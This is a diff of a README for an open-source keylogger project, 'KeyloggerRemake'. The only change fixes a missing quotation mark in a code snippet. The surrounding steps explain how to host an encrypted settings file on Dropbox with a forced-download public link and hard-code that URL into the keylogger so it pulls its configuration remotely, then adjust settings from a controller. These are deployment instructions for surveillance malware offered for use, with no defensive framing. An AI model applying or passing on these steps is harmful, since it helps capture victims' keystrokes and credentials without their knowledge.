@@ -10,7 +10,7 @@ Things to do after downloading:
       - e.g `strEncryptDir = @"C\Users\TestUser\Folder\EncryptedJson.txt"`
 2. Upload the encrypted json file onto a file hosting service like [Dropbox](https://www.dropbox.com/), and get its public link ([Must auto download!](https://www.dropbox.com/help/desktop-web/force-download)).
 3. Change KeyloggerRemake's encrypted key to the public link of the specified encrypted directory in the Controller
-   - In [classGetEncryption](https://github.com/outerme/KeyloggerRemake/blob/master/KeyloggerRemake/classGetEncryption.cs): Change `strEncryptedFile = "ADDYOURURLHERE` to the public URL of that encrypted Json file.
+   - In [classGetEncryption](https://github.com/outerme/KeyloggerRemake/blob/master/KeyloggerRemake/classGetEncryption.cs): Change `strEncryptedFile = "ADDYOURURLHERE"` to the public URL of that encrypted Json file.
       - e.g `strEncryptedFile = "https://www.dropbox.com/s/dsdddq32re/EncryptedJson.txt?dl=1"`
 4. Change settings in KeyloggerController upon runtime.
 
